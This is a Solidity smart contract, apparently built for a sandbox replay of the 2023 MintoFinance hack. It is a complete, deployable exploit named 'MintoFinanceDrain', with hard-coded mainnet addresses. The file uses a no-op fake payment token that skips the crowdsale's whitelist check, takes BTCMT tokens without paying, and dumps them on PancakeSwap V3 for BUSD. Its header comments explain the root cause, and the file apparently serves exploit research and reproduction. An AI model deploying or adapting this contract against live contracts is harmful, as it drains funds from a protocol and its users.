// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

// Synthetic standalone exploit for the EVM Playground (2023-07-MintoFinance).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (attacker = address(this), and the fake `transferFrom` payment-token
// override lives on the test itself), so there is no standalone attack
// contract to deploy. This contract is a faithful, self-contained copy of
// that inline attack (testExploit -> run(), plus the fake transferFrom) so
// the playground can deploy it and record run(). Logic and constants are
// copied verbatim from test/MintoFinance_exp.sol.
//
// Root cause: ReferralCrowdsale.buyTokens() only whitelist-checks
// `paymentToken` on the trailing `else` branch. When an admin has set
// dexInfo.manualPrice > 0 (true at this fork block), buyTokens() routes to
// _buy(purchaseParams.paymentToken, ...) with NO whitelist check at all, and
// _buy() sends BTCMT to the buyer BEFORE "collecting" payment via
// safeTransferFrom(payToken, ...). Passing this contract's own address as
// paymentToken -- whose transferFrom() is a no-op that returns true -- lets
// the attacker walk away with BTCMT for free, which is then dumped on
// PancakeSwap V3 for BUSD/USDT.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface ReferalCrowdSales {
    struct LinkParameters {
        bytes32 linkHash;
        address linkFather;
        address linkSon;
        uint256 fatherPercent;
        bytes linkSignature;
    }

    struct PurchaseParameters {
        bool give;
        bool lockedPurchase;
        address paymentToken;
        uint256 usdtAmount;
        uint256 btcmtAmount;
        uint256 lockIndex;
        uint256 expirationTime;
        bytes buySignature;
    }

    function buyTokens(LinkParameters memory linkParams, PurchaseParameters memory purchaseParams) external;
}

interface PancakeRouter3 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams memory params) external payable returns (uint256 amountOut);
}

contract MintoFinanceDrain {
    address constant BUSD = 0x55d398326f99059fF775485246999027B3197955;
    address constant BTCMT = 0x410a56541bD912F9B60943fcB344f1E3D6F09567;
    address constant CROWDSALE = 0xDbF1C56b2aD121Fe705f9b68225378aa6784f3e5;
    address constant PANCAKE_V3_ROUTER = 0x13f4EA83D0bd40E75C8222255bc855a974568Dd4;

    // step 0: buy BTCMT from the crowdsale using THIS contract as the
    // (fake) payment token -- routes through the unchecked manualPrice
    // branch and sends BTCMT before "collecting" the no-op payment below.
    function run() external {
        ReferalCrowdSales.LinkParameters memory linkParams;
        ReferalCrowdSales.PurchaseParameters memory purchaseParams;

        linkParams.linkHash = 0xc69c51e039668f688f28f427c63cd60aa986f8ce1546039e6a302fb721473814;
        linkParams.linkFather = address(0);
        linkParams.linkSon = address(0);
        linkParams.fatherPercent = 0;
        linkParams.linkSignature = "";

        purchaseParams.give = false;
        purchaseParams.lockedPurchase = false;
        purchaseParams.paymentToken = address(this);
        purchaseParams.usdtAmount = 12_100e18;
        purchaseParams.btcmtAmount = 0;
        purchaseParams.expirationTime = 0;
        purchaseParams.buySignature = "";

        ReferalCrowdSales(CROWDSALE).buyTokens(linkParams, purchaseParams);

        uint256 balance = IERC20(BTCMT).balanceOf(address(this));

        // step 1: liquidate the free BTCMT on PancakeSwap V3 (0.01% pool) for BUSD/USDT.
        IERC20(BTCMT).approve(PANCAKE_V3_ROUTER, type(uint256).max);

        PancakeRouter3.ExactInputSingleParams memory inputParams;
        inputParams.tokenIn = BTCMT;
        inputParams.tokenOut = BUSD;
        inputParams.fee = uint24(100);
        inputParams.recipient = address(this);
        inputParams.amountIn = balance;
        inputParams.amountOutMinimum = uint256(0);
        inputParams.sqrtPriceLimitX96 = uint160(0);
        PancakeRouter3(PANCAKE_V3_ROUTER).exactInputSingle(inputParams);
    }

    // THE FAKE PAYMENT TOKEN — no-op transferFrom that returns true without
    // moving any funds. This is the crux of the exploit: safeTransferFrom
    // in the crowdsale's _buy() only checks the boolean return value.
    function transferFrom(address, address, uint256) external pure returns (bool) {
        return true;
    }
}
